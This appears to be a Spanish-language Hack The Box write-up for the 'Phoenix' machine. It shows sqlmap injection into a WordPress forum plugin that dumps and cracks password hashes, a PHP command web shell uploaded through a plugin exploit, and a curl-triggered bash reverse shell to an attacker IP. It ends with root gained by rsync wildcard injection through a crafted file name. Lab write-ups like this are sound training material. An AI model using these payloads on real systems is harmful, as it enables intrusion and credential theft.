---
layout: post
title: Phoenix
date: 2023-04-02
description:
img:
fig-caption:
tags: [eWPT, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Phoenix-htb/Phoenix.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL - SQLMap

* Abuso de Plugins WordPress

* Dumpeo de hashes

* Abuso de configuración de PAM

* Abuso de tarea CRON (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.149 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 18:01 GMT
Nmap scan report for 10.10.11.149
Host is up (0.083s latency).
Not shown: 55649 closed tcp ports (reset), 9883 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.11.149 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 18:02 GMT
Nmap scan report for 10.10.11.149
Host is up (0.35s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9df387cd347583e03f50d839c6a5329f (RSA)
|   256 ab61ceebede28676e9e152faa5c77b20 (ECDSA)
|_  256 262e38cadf72d454fc75a49165cce8b0 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Not valid before: 2022-02-15T20:08:43
|_Not valid after:  2032-02-13T20:08:43
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.17 seconds
```

Añado el dominio ```phoenix.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP) | Puerto 443 (HTTPS)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.149
http://10.10.11.149 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.149], RedirectLocation[https://phoenix.htb/], Title[301 Moved Permanently], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY]
https://phoenix.htb/ [200 OK] Apache, Bootstrap[1.0.0,5.9], Country[RESERVED][ZZ], Email[phoenix@phoenix.htb], HTML5, HTTPServer[Apache], IP[10.10.11.149], JQuery[3.6.0], Lightbox, MetaGenerator[WordPress 5.9], Script[text/javascript], Title[Phoenix Security &#8211; Securing the future.], UncommonHeaders[link,x-content-type-options,upgrade], WordPress[5.9], X-Frame-Options[DENY]
```

```null
whatweb https://10.10.11.149
https://10.10.11.149 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.149], RedirectLocation[https://phoenix.htb/], UncommonHeaders[x-redirect-by,x-content-type-options,upgrade], X-Frame-Options[DENY]
https://phoenix.htb/ [200 OK] Apache, Bootstrap[1.0.0,5.9], Country[RESERVED][ZZ], Email[phoenix@phoenix.htb], HTML5, HTTPServer[Apache], IP[10.10.11.149], JQuery[3.6.0], Lightbox, MetaGenerator[WordPress 5.9], Script[text/javascript], Title[Phoenix Security &#8211; Securing the future.], UncommonHeaders[link,x-content-type-options,upgrade], WordPress[5.9], X-Frame-Options[DENY]
```

La página principal se ve así:

<img src="/writeups/assets/img/Phoenix-htb/1.png" alt="">

Me puedo registrar en ```/registration```

<img src="/writeups/assets/img/Phoenix-htb/2.png" alt="">

Al iniciar sesión me redirige a ```/wp-admin```

<img src="/writeups/assets/img/Phoenix-htb/3.png" alt="">

En el código fuente se leakean varios plugins instalados

```null
curl -s -X GET https://phoenix.htb/ -k | grep "/wp-content/plugins" | grep -oP "'.*?'" | grep wp
'https://phoenix.htb/wp-content/plugins/pie-register/assets/css/pie_notice.css?ver=3.7.2.6'
'https://phoenix.htb/wp-content/plugins/timeline-event-history/includes/gutenberg/dist/blocks.style.build.css'
'https://phoenix.htb/wp-content/plugins/accordion-slider-gallery/assets/css/accordion-slider.css?ver=1.4'
'https://phoenix.htb/wp-content/plugins/asgaros-forum/libs/fontawesome/css/all.min.css?ver=1.15.12'
'https://phoenix.htb/wp-content/plugins/asgaros-forum/libs/fontawesome/css/v4-shims.min.css?ver=1.15.12'
'https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/css/lightbox.min.css?ver=1.7'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/css/bootstrap-front.css?ver=1.7'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/css/font-awesome-latest/css/fontawesome-all.min.css?ver=5.9'
'https://phoenix.htb/wp-content/plugins/pie-register/assets/css/dialog.css?ver=3.7.2.6'
'https://phoenix.htb/wp-content/plugins/timeline-event-history/assets/resources/fontawesome/css/fontawesome.min.css?ver=1.6'
'https://phoenix.htb/wp-content/plugins/pie-register/assets/js/dialog.js?ver=3.7.2.6'
'https://phoenix.htb/wp-content/plugins/accordion-slider-gallery/assets/js/accordion-slider-js.js?ver=1.4'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/js/lightbox.min.js?ver=1.7'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/js/packery.min.js?ver=1.7'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/js/isotope.pkgd.js?ver=1.7'
'https://phoenix.htb/wp-content/plugins/photo-gallery-builder/assets/js/imagesloaded.pkgd.min.js?ver=1.7'
```

El plugin ```asgaros-forum``` es vulnerable a una inyección SQL. En este [ártículo](https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1) está detallado. Utilizo ```SQLMap``` para automatizar el proceso

```null
sqlmap --url 'https://phoenix.htb/forum/?subscribe_topic=1%20' --batch --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:26:08 /2023-04-04/

available databases [2]:
[*] information_schema
[*] wordpress
```

Como va demasiado tiempo, voy a aprovecharme de que la base de datos ```wordpress``` tiene siempre una estructura similar para dumpear las tablas que me interesan

<img src="/writeups/assets/img/Phoenix-htb/4.png" alt="">

Dumpeo hashes de usuarios

```null
sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=1%20" -D wordpress -T wp_users -C id,user_pass --dump --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:45:33 /2023-04-04/

Database: wordpress
Table: wp_users
[5 entries]
+----+------------------------------------+
| id | user_pass                          |
+----+------------------------------------+
| 1  | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. |
| 3  | $P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz. |
| 5  | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. |
| 6  | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 |
| 7  | $P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e. |
+----+------------------------------------+
```

Los crackeo con ```hashcat```

```null
hashcat hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.:superphoenix
$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.:phoenixthefirebird14
```

No son válidos por SSH. Enumero el resto de plugins que están instalados

```null
sqlmap -u "https://phoenix.htb/forum/?subscribe_topic=1" --level=2 --risk=2 --sql-query="SELECT option_value FROM wp_options WHERE option_name = 'active_plugins';" --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:52:28 /2023-04-04/

[11:52:29] [INFO] resuming back-end DBMS 'mysql' 
[11:52:29] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('asgarosforum_unique_id=642c0f66792df;asgarosforum_unread_cleared=1000-01-01%...%3A00%3A00'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
.php";i:1;s:25:"adminimize/adminimize.php";i:2;s:31:"asgaros-forum/asgaros-forum.php";i:3;s:43:"download-from-files/download-from-files.php";i:4;s:67:"miniorange-2-factor-authentication/miniorange_2_factor_settings.php";i:5;s:47:"photo-gallery-builder/photo-gallery-builder.php";i:6;s:29:"pie-register/pie-register.php";i:7;s:45:"simple-local-avatars/simple-local-avatars.php";i:8;s:38:"timeline-event-history/timeline-wp.php";}
SELECT option_value FROM wp_options WHERE option_name = 'active_plugins': 'a:9:{i:0;s:45:"accordion-slider-gallery/accordion-slider.php";i:1;s:25:"adminimize/adminimize.php";i:2;s:31:"asgaros-forum/asgaros-forum.php";i:3;s:43:"download-from-files/download-from-files.php";i:4;s:67:"miniorange-2-factor-authentication/miniorange_2_factor_settings.php";i:5;s:47:"photo-gallery-builder/photo-gallery-builder.php";i:6;s:29:"pie-register/pie-register.php";i:7;s:45:"simple-local-avatars/simple-local-avatars.php";i:8;s:38:"timeline-event-history/timeline-wp.php";}'

[*] ending @ 14:35:25 /2023-04-04/
```

El más destacable es ```download-from-files.php```. Tiene un exploit asociado

```null
searchsploit download from files
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload                                                                                                              | php/webapps/50287.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Para que el exploit ignore el certificado autofirmado añado lo siguiente:

```null
import urllib3

urllib3.disable_warnings()
```

Mi archivo que me permite ejecutar comandos es:

```null
cat cmd.phtml
<?php
  shell_exec($_REQUEST['cmd']);
?>
```

Además, en todas las peticiones un ```verify=False```

```null
python3 exploit.py https://phoenix.htb/ ./cmd.phtml
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
Uploading Shell...
Shell Uploaded!
https://phoenix.htb/wp-admin/cmd.phtml
```

Me envío una reverse shell

```null
curl -s -X GET -k https://phoenix.htb/wp-admin/cmd.phtml?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.2/443%200%3E%261%27
```

Gano acceso a la máquina víctima

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.149.
Ncat: Connection from 10.10.11.149:54766.
bash: cannot set terminal process group (961): Inappropriate ioctl for device
bash: no job control in this shell
wp_user@phoenix:~/wordpress/wp-admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
wp_user@phoenix:~/wordpress/wp-admin$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
wp_user@phoenix:~/wordpress/wp-admin$ export TERM=xterm
wp_user@phoenix:~/wordpress/wp-admin$ export SHELL=bash
wp_user@phoenix:~/wordpress/wp-admin$ stty rows 55 columns 209
```

Tengo asignada otra intefaz

```null
wp_user@phoenix:~/wordpress/wp-admin$ hostname -I
10.10.11.149 10.11.12.13 dead:beef::250:56ff:feb9:62ff 
```

En el ```wp-config.php``` están las credenciales de acceso a la base de datos

```null
/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', '<++32%himself%FIRM%section%32++>' );
```

Listo los usuarios

```null
wp_user@phoenix:~/wordpress$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
phoenix:x:1000:1000:Phoenix:/home/phoenix:/bin/bash
editor:x:1002:1002:John Smith,1,1,1,1:/home/editor:/bin/bash
```

La contraseña ```superphoenix``` es válida para el usuario ```editor```, pero me pide un código de verificación. En el archivo de configuración de SSH se está incluyendo esta regla

```null
wp_user@phoenix:/$ cat /etc/pam.d/sshd | grep -v "^#" | grep .
@include common-auth
auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf
auth required pam_google_authenticator.so nullok user=root secret=/var/lib/twofactor/${USER}
account    required     pam_nologin.so
@include common-account
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
@include common-session
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
@include common-password
```

Para la otra intefaz no lo requiere

```null
wp_user@phoenix:/$ cat /etc/security/access-local.conf
+ : ALL : 10.11.12.13/24
- : ALL : ALL
```

Puedo ver la primera flag

```null
wp_user@phoenix:/$ ssh editor@10.11.12.13
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 04 Apr 2023 02:06:32 PM UTC

  System load:             0.03
  Usage of /:              69.3% of 4.36GB
  Memory usage:            22%
  Swap usage:              0%
  Processes:               220
  Users logged in:         0
  IPv4 address for ens160: 10.10.11.149
  IPv6 address for ens160: dead:beef::250:56ff:feb9:62ff
  IPv4 address for eth0:   10.11.12.13


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 14:06:24 2023 from 10.11.12.13
editor@phoenix:~$ cat user.txt 
9fe0585b3ea3addc5f1a48e90323ff89
```

# Escalada

En el directorio ```/backups``` hay varios archivos comprimidos

```null
editor@phoenix:/backups$ ls -la
total 6648
drwxr-x---  2 editor editor   4096 Apr  4 14:12 .
drwxr-xr-x 20 root   root     4096 Feb 25  2022 ..
-rw-r--r--  1 root   root   676529 Apr  4 13:45 phoenix.htb.2023-04-04-13-45.tar.gz
-rw-r--r--  1 root   root   676534 Apr  4 13:48 phoenix.htb.2023-04-04-13-48.tar.gz
-rw-r--r--  1 root   root   676535 Apr  4 13:51 phoenix.htb.2023-04-04-13-51.tar.gz
-rw-r--r--  1 root   root   676530 Apr  4 13:54 phoenix.htb.2023-04-04-13-54.tar.gz
-rw-r--r--  1 root   root   676529 Apr  4 13:57 phoenix.htb.2023-04-04-13-57.tar.gz
-rw-r--r--  1 root   root   676529 Apr  4 14:00 phoenix.htb.2023-04-04-14-00.tar.gz
-rw-r--r--  1 root   root   676534 Apr  4 14:03 phoenix.htb.2023-04-04-14-03.tar.gz
-rw-r--r--  1 root   root   676529 Apr  4 14:06 phoenix.htb.2023-04-04-14-06.tar.gz
-rw-r--r--  1 root   root   676529 Apr  4 14:09 phoenix.htb.2023-04-04-14-09.tar.gz
-rw-r--r--  1 root   root   676531 Apr  4 14:12 phoenix.htb.2023-04-04-14-12.tar.gz
```

Corresponde a una tarea CRON que se ejecuta cada 3 minutos. Busco por archivos cuya fecha de modificación sea superior a cuando se retiró la máquina

```null
editor@phoenix:/$ find -type f -newermt "2022-02-15" 2>/dev/null | grep usr | grep bin
./usr/local/bin/cron.sh.x
./usr/bin/locale-check
```

Es un archivo compilado de 64 bits

```null
editor@phoenix:/$ file /usr/local/bin/cron.sh.x
/usr/local/bin/cron.sh.x: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7afde696e476ac5d8300e407cbfb9ec08a9b7f07, for GNU/Linux 3.2.0, stripped
```

Ejecuto el ```pspy``` en segundo plano y envío el stdout a un archivo

```null
editor@phoenix:/tmp$ ./pspy > pspyenum &
[2] 36395
```

Ejecuto el binario

```null
editor@phoenix:/tmp$ /usr/local/bin/cron.sh.x
```

```null
kill -9 36395
```

En la captura puedo ver los comandos que se han ejecutado

```null
NOW=$(date +"%Y-%m-%d-%H-%M")
FILE="phoenix.htb.$NOW.tar"

cd /backups
mysqldump -u root wordpress > dbbackup.sql
tar -cf $FILE dbbackup.sql && rm dbbackup.sql
gzip -9 $FILE
find . -type f -mmin +30 -delete
rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/
 /usr/local/bin/cron.sh.x 
2023/04/04 14:32:07 CMD: UID=1002 PID=36298  | ssh -l jit 10.11.12.14 rsync --server -te.LsfxC --ignore-existing . /backups/ 
2023/04/04 14:32:07 CMD: UID=1002 PID=36297  | rsync --ignore-existing -t phoenix.htb.2023-04-04-14-03.tar.gz phoenix.htb.2023-04-04-14-06.tar.gz phoenix.htb.2023-04-04-14-09.tar.gz phoenix.htb.2023-04-04-14-12.tar.gz phoenix.htb.2023-04-04-14-15.tar.gz phoenix.htb.2023-04-04-14-18.tar.gz phoenix.htb.2023-04-04-14-21.tar.gz phoenix.htb.2023-04-04-14-24.tar.gz phoenix.htb.2023-04-04-14-27.tar.gz phoenix.htb.2023-04-04-14-29.tar.gz phoenix.htb.2023-04-04-14-30.tar.gz phoenix.htb.2023-04-04-14-32.tar.gz jit@10.11.12.14:/backups/ 
```

Está tomando todos los archivos que se encuentran en el directorio ```/backups```. Suponiendo que se está utilizando un wildcard (*), se puede probar a inyectar un comando en el nombre del archivo

<img src="/writeups/assets/img/Phoenix-htb/5.png" alt="">

La idea va a ser asignarle el privilegio SUID a la bash. Creo un archivo ```pwned.sh``` y le asigno permisos de ejecución

```null
chmod u+s /bin/bash
```

Creo el archivo

```null
editor@phoenix:/backups$ touch -- "-e sh pwned.sh"
```

Ejecuto el binario

```null
/usr/local/bin/cron.sh.x
```

La bash se convierte en SUID

```null
editor@phoenix:/backups$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Puedo ver la segunda flag

```null
editor@phoenix:/backups$ bash -p
bash-5.0# cat /root/root.txt 
2ed6bd67180e0d0d8d343e91c06aec81
```